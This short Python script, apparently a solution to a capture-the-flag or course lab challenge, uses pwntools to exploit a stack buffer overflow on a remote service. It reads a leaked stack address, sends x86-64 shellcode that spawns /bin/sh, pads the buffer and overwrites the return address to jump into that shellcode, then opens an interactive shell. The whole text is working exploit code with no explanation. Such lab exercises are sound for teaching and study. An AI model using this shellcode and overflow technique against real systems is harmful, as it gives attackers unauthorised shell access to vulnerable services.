from pwn import *

context.log_level = 'INFO'

conn = remote("47.99.80.189", 10011)
conn.recvuntil("ID:\n")
conn.sendline("3180103012")

# conn = process('crackme/01.out')

conn.recvuntil("[*] Please input your ID:\n")
conn.sendline("3180103012")

conn.recvuntil("Your ID is stored at:0x")
id_addr = int(conn.recv(16), 16)

shellcode_addr = p64(id_addr - 0x118)  # also addr of `str`

conn.recvuntil("[*] Now, give me something to overflow me!\n")

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

conn.sendline(shellcode + b"\0" * (256 - len(shellcode) + 8) + shellcode_addr)

conn.interactive()
